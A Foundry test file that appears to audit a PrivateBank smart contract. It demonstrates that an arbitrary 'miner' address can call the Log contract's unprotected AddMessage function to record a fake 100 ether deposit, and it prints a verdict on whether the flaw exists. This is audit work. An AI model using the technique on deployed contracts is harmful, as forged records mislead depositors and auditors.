// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol";

contract PrivateBankAuditTest is Test {
    // Renamed to avoid conflict with forge-std's log event
    Log public logContract;
    PrivateBank public privateBank;
    address public miner = address(0x111);
    address public user = address(0x222);

    function setUp() public {
        // Deploy Log contract
        logContract = new Log();
        
        // Deploy PrivateBank with Log contract address
        privateBank = new PrivateBank(address(logContract));
    }

    function testUnauthorizedAddMessageCall() public {
        console.log("--- BEFORE-Trigger AddMessage ---");
        (address initCaller, string memory initData, uint256 initVal, uint256 initTime) = logContract.LastMsg();
        
        console.log("Before state:");
        console.log("  LastMsg.Caller:   ", initCaller);
        console.log("  LastMsg.Data:     ", initData);
        console.log("  LastMsg.Value:    ", initVal);
        console.log("  LastMsg.Time:     ", initTime);
        console.log("-------------------------------");

        // Trigger: Miner directly calls AddMessage with fake parameters - should succeed
        console.log("--- TRIGGER: Miner calls AddMessage ---");
        vm.prank(miner);
        logContract.AddMessage(user, 100 ether, "Fake Deposit");

        // AFTER: Query state after miner's action
        console.log("--- AFTER-Trigger AddMessage ---");
        (address afterCaller, string memory afterData, uint256 afterVal, uint256 afterTime) = logContract.LastMsg();
        
        console.log("After state:");
        console.log("  LastMsg.Caller:   ", afterCaller);
        console.log("  LastMsg.Data:     ", afterData);
        console.log("  LastMsg.Value:    ", afterVal);
        console.log("  LastMsg.Time:     ", afterTime);
        console.log("-------------------------------");

        // Evaluate vulnerability based on state change
        bool stateChanged = (afterCaller == miner) && 
                           (afterVal == 100 ether) &&
                           (keccak256(abi.encodePacked(afterData)) == keccak256(abi.encodePacked("Fake Deposit")));

        // Actual user performs legitimate deposit
        console.log("--- User deposit ---");
        vm.deal(user, 1 ether);
        vm.prank(user);
        privateBank.Deposit{value: 1 ether}();

        // Final vulnerability verdict
        if (stateChanged) {
            console.log("Vulnerability Exists: Miner successfully altered Log contract state via AddMessage");
        } else {
            console.log("Vulnerability not Exist: Log contract state remains intact after unauthorized call");
        }
    }
}